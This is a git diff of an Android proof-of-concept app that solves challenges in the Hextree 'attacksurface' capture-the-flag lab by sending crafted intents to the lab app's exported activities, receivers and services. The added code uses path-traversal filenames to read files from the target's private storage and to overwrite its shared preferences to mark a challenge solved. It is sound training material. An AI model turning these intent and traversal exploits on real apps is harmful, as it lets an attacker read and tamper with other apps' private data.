@@ -3,6 +3,7 @@ package com.hextree.pocapp;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -26,6 +27,13 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 
 
 public class MainHextreeActivity extends AppCompatActivity {
@@ -116,7 +124,7 @@ public class MainHextreeActivity extends AppCompatActivity {
 
         //ACTIVITY INTENT LISTENERS
         Intent intent = getIntent();
-        //Listen for [StartActivityForResult() calls and return (Flag 10-12)]
+        //Listen for [StartActivityForResult() calls and return (Flag 10,11,12)]
         if (intent.getAction() == "io.hextree.attacksurface.ATTACK_ME") {
             Intent returnIntent = new Intent();
             returnIntent.putExtra("token", 1094795585);
@@ -156,20 +164,20 @@ public class MainHextreeActivity extends AppCompatActivity {
         Button homebutton = findViewById(R.id.home_button);
         homebutton.setOnClickListener(new View.OnClickListener() {
 
-            public void launchFlag1Activity() {
+            public void Flag1launchActivity() {
                 Intent intent = new Intent();
                 intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
                 startActivity(intent);
             }
 
-            public void launchFlag2ActivityWithAction() {
+            public void Flag2launchActivityWithAction() {
                 Intent intent = new Intent();
                 intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
                 intent.setAction("io.hextree.action.GIVE_FLAG");
                 startActivity(intent);
             }
 
-            public void launchFlag3ActivityWithActionAndData() {
+            public void Flag3launchActivityWithActionAndData() {
                 Intent intent = new Intent();
                 intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
                 intent.setAction("io.hextree.action.GIVE_FLAG");
@@ -177,7 +185,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 startActivity(intent);
             }
 
-            public void launchFlag4Activity() {
+            public void Flag4launchActivity() {
                 Intent intent3 = new Intent();
                 intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                 intent3.setAction("GET_FLAG_ACTION");
@@ -196,7 +204,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 }, 200);
             }
 
-            public void launchFlag5ActivityWithMultipleIntent() {
+            public void Flag5launchActivityWithMultipleIntent() {
                 Intent intent = new Intent();
                 Intent nextIntent = new Intent();
                 Intent nextnextIntent = new Intent();
@@ -211,7 +219,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 startActivity(nextnextIntent);
             }
 
-            public void launchFlag6ActivityWithIntentNotExported() {
+            public void Flag6launchActivityWithIntentNotExported() {
                 Intent intent = new Intent();
                 Intent nextIntent = new Intent();
                 Intent nextnextIntent = new Intent();
@@ -228,7 +236,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 startActivity(nextnextIntent);
             }
 
-            public void launchFlag7ActivityLifecycleTrick() {
+            public void Flag7launchActivityLifecycleTrick() {
                 Intent openIntent = new Intent();
                 openIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                 openIntent.setAction("OPEN");
@@ -243,26 +251,26 @@ public class MainHextreeActivity extends AppCompatActivity {
                 }, 100); // Delay of 100 milliseconds
             }
 
-            public void launchFlag8Activity() {
+            public void Flag8launchActivity() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity");
                 startActivity(intent);
             }
 
-            public void launchFlag9ActivityWithReturnExtra() {
+            public void Flag9launchActivityWithReturnExtra() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity");
                 startActivityForResult(intent, 1337);
             }
 
-            public void sendFlag16Broadcast() {
+            public void Flag16sendBroadcast() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
                 intent.putExtra("flag", "give-flag-16");
                 sendBroadcast(intent);
             }
 
-            public void sendFlag17orderedBroadcast() {
+            public void Flag17sendOrderedBroadcast() {
                 Intent serviceintent = new Intent();
                 serviceintent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
                 serviceintent.putExtra("flag", "give-flag-17");
@@ -276,7 +284,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 }, null, 0, null, null);
             }
 
-            public void launchFlag22ActivitySendPendingIntent() {
+            public void Flag22launchActivitySendPendingIntent() {
                 Intent innerIntent = new Intent();
                 innerIntent.setClassName(getPackageName(), MainHextreeActivity.class.getCanonicalName());
                 PendingIntent pendingIntent = PendingIntent.getActivity(MainHextreeActivity.this,0, innerIntent,PendingIntent.FLAG_MUTABLE);
@@ -286,7 +294,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 startActivity(intent);
             }
 
-            public void sendFlag19WidgetBroadcast() {
+            public void Flag19sendWidgetBroadcast() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
                 intent.setAction("MALICIOUS_APPWIDGET_UPDATE");
@@ -297,7 +305,7 @@ public class MainHextreeActivity extends AppCompatActivity {
                 sendBroadcast(intent);
             }
 
-            public void sendFlag20NotificationBroadcast() {
+            public void Flag20sendNotificationBroadcast() {
                 Intent intent = new Intent();
                 intent.setAction("io.hextree.broadcast.GET_FLAG");
                 intent.putExtra("give-flag", true);
@@ -305,14 +313,14 @@ public class MainHextreeActivity extends AppCompatActivity {
                 sendBroadcast(intent);
             }
 
-            public void launchFlag24Service() {
+            public void Flag24launchService() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
                 intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
                 startService(intent);
             }
 
-            public void launchFlag25ServiceMutipleActionToRunningService() {
+            public void Flag25launchServiceMutipleActionToRunningService() {
                 Intent intent1 = new Intent();
                 intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                 intent1.setAction("io.hextree.services.UNLOCK1");
@@ -331,13 +339,13 @@ public class MainHextreeActivity extends AppCompatActivity {
                 }, 200);
             }
 
-            public void BindFlag26ServiceWithMessage() {
+            public void Flag26BindServiceWithMessage() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
                 bindService(intent, serviceConnectionflag26, Context.BIND_AUTO_CREATE);
             }
 
-            public void BindFlag27ServiceWithMessageReplies() {
+            public void Flag27BindServiceWithMessageReplies() {
                 Intent intent = new Intent();
                 intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
                 bindService(intent, serviceConnectionflag27a, Context.BIND_AUTO_CREATE);
@@ -406,23 +414,44 @@ public class MainHextreeActivity extends AppCompatActivity {
                 startActivityForResult(intent, 1111);
             }
 
+            public void Flag34FileRead() {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
+                intent.putExtra("filename", "flags/flag34.txt");
+                startActivityForResult(intent, 2222);
+            }
+
+            public void Flag35RootFileRead() {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
+                intent.putExtra("filename", "../flag35.txt");
+                startActivityForResult(intent, 3333);
+            }
+
+            public void Flag36FileWrite() {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
+                intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
+                startActivityForResult(intent, 4444);
+            }
+
             //trigger flag functions on clicking
             @Override
             public void onClick(View view) {
-                Flag33queryWithSQLi();
+                Flag36FileWrite();
             }
 
         });
 
     }
 
-    // Receive result from activity (Flag 9, 33)
+    // Receive result from activity (Flag 9,33,34,35,36)
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent intent) {
         //Flag9
         if (requestCode == 1337 &&resultCode == RESULT_OK && intent != null){
-            super.onActivityResult(requestCode, resultCode, intent);
             Utils.showDialog(this, intent);
+            super.onActivityResult(requestCode, resultCode, intent);
         }
         //Flag33.1
         else if (requestCode == 1111 &&resultCode == RESULT_OK && intent != null) {
@@ -440,10 +469,72 @@ public class MainHextreeActivity extends AppCompatActivity {
                     ((TextView) findViewById(R.id.home_text)).append("\n"+sb.toString());
                 } while (cursor.moveToNext());
             }
+            super.onActivityResult(requestCode, resultCode, intent);
+        }
+        //Flag34
+        else if (requestCode == 2222 &&resultCode == RESULT_CANCELED && intent != null) {
+            Log.i("FileURI", "FileURI: "+intent.getData());
+            try {
+                InputStream inputstream = null;
+                inputstream = getContentResolver().openInputStream(intent.getData());
+                BufferedReader reader = new BufferedReader(new InputStreamReader(inputstream));
+                String line;
+                while((line = reader.readLine()) != null) {
+                    Log.d("FILE", "[*] "+line);
+                }
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+            super.onActivityResult(requestCode, resultCode, intent);
+        }
+        //Flag35
+        else if (requestCode == 3333 &&resultCode == RESULT_CANCELED && intent != null) {
+            Log.i("FileURI", "FileURI: "+intent.getData());
+            try {
+                InputStream inputstream = null;
+                inputstream = getContentResolver().openInputStream(intent.getData());
+                BufferedReader reader = new BufferedReader(new InputStreamReader(inputstream));
+                String line;
+                while((line = reader.readLine()) != null) {
+                    Log.d("FILE", "[*] "+line);
+                }
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+            super.onActivityResult(requestCode, resultCode, intent);
+        }
+        //Flag36
+        else if (requestCode == 4444 &&resultCode == RESULT_CANCELED && intent != null) {
+            // Retrieve the intent and URI
+            Log.i("FileURI", "FileURI: "+intent.getData());
+            Uri fileUri = intent.getData();
+            if (fileUri != null) {
+                try {
+                    // Obtain ContentResolver
+                    ContentResolver contentResolver = getContentResolver();
+                    // Open the URI with "w" mode to allow overwriting
+                    try (OutputStream outputStream = contentResolver.openOutputStream(fileUri, "w");
+                         OutputStreamWriter writer = new OutputStreamWriter(outputStream)) {
+                        // Write the new content
+                        writer.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
+                                "<map>\n" +
+                                "    <boolean name=\"solved\" value=\"true\" />\n" +
+                                "</map>");
+                        writer.flush();
+                        Log.i("FileOperation", "File overwritten successfully.");
+                    }
+                } catch (Exception e) {
+                    Log.e("FileOperation", "Error overwriting file using ContentResolver: " + e.getMessage(), e);
+                }
+            } else {
+                Log.e("FileOperation", "No URI received in the intent.");
+            }
+            super.onActivityResult(requestCode, resultCode, intent);
         }
         else {
             TextView homeText = findViewById(R.id.home_text);
             homeText.setText("FAILED!");
+            super.onActivityResult(requestCode, resultCode, intent);
         }
     }
 
